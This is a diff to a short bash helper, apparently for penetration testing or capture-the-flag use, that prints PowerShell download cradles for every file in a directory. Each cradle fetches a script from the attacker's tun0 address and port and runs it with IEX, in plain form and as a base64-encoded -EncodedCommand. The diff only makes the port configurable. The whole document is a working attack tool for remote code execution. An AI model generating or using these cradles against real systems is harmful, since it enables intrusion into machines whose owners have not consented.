@@ -1,7 +1,13 @@
 #!/bin/bash
 #pwed = powershell web
+if [ -z $1 ]
+  then
+    port=9000
+else
+    port=$1
+fi
+
 tun0=$(/sbin/ifconfig tun0 | grep 'inet' | head -1 | awk '{print $2}')
-port=9000
 for f in *; do
 	echo powershell -EncodedCommand $(echo -n "IEX (New-Object Net.WebClient).DownloadString('http://$tun0:$port/$f')" | iconv  -t UTF-16LE | base64 -w0)
 	echo "IEX (New-Object Net.WebClient).DownloadString('http://$tun0:$port/$f')"
